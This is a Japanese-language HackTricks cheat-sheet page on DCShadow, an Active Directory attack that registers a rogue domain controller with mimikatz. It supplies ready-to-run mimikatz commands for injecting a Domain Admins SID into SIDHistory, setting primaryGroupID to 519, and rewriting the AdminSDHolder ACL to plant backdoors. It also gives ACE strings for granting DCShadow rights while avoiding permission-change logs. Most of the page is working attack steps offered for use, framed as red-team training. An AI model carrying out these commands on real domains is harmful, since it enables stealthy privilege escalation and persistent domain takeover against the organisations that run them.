<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に **参加** または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) を **フォロー** してください。
* **HackTricks** および **HackTricks Cloud** の github リポジトリに **PRを提出** して **あなたのハッキングトリックを共有** してください。

</details>


# DCShadow

これは新しい **ドメインコントローラ** を AD に登録し、指定されたオブジェクトに対して **SIDHistory、SPNsなどの属性を** **ログを残さずに** **プッシュ** するために使用します。 **変更に関するログ** は **残りません**。 **DA 権限** が必要で、 **ルートドメイン** 内にいる必要があります。\
間違ったデータを使用すると、かなり醜いログが表示されます。

攻撃を実行するには、2つの mimikatz インスタンスが必要です。そのうちの1つは **SYSTEM 権限** で RPC サーバーを起動し（ここに行いたい変更を指定する必要があります）、もう1つのインスタンスは値をプッシュするために使用されます:

{% code title="mimikatz1（RPCサーバー）" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - DAまたは同等の権限が必要" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

**`elevate::token`**は`mimikatz1`セッションでは機能しないことに注意してください。なぜなら、それはスレッドの特権を昇格させるものであり、私たちは**プロセスの特権を昇格**する必要があるからです。\
また、「LDAP」オブジェクトを選択することもできます：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

DAからまたはこれらの最小権限を持つユーザーから変更をプッシュできます：

* **ドメインオブジェクト**：
  * _DS-Install-Replica_（ドメイン内のレプリカの追加/削除）
  * _DS-Replication-Manage-Topology_（レプリケーショントポロジの管理）
  * _DS-Replication-Synchronize_（レプリケーション同期）
* **構成コンテナ**内の**サイトオブジェクト**（およびその子）：
  * _CreateChild and DeleteChild_
* **DCとして登録されているコンピューターのオブジェクト**：
  * _WriteProperty_（Writeではなく）
* **ターゲットオブジェクト**：
  * _WriteProperty_（Writeではなく）

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)を使用して、特権のないユーザーにこれらの特権を付与できます（これにより一部のログが残ります）。これはDA特権を持つよりもはるかに制限されたものです。\
例：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` これは、ユーザー名_**student1**_がマシン_**mcorp-student1**_にログオンしているときに、オブジェクト_**root1user**_に対するDCShadow権限を持つことを意味します。

## DCShadowを使用してバックドアを作成する
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Chage PrimaryGroupID (put user as member of Domain Administrators)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="AdminSDHolderのntSecurityDescriptorを変更する（ユーザーに完全な制御権を付与する）" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## シャドウセプション - DCShadowを使用してDCShadow権限を付与する（変更された権限ログなし）

次のACEに、ユーザーのSIDを末尾に追加する必要があります：

* ドメインオブジェクトに対して：
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* 攻撃者のコンピュータオブジェクトに対して：`(A;;WP;;;UserSID)`
* ターゲットユーザーオブジェクトに対して：`(A;;WP;;;UserSID)`
* 構成コンテナ内のサイトオブジェクトに対して：`(A;CI;CCDC;;;UserSID)`

オブジェクトの現在のACEを取得するには：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

この場合、1つだけでなく**複数の変更**を行う必要があることに注意してください。したがって、**mimikatz1セッション**（RPCサーバー）で、各変更に**`/stack`パラメータ**を使用します。この方法で、ルージュサーバーですべてのスタックされた変更を実行するには、1回だけ**`/push`**する必要があります。

[**ired.teamのDCShadowに関する詳細情報**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
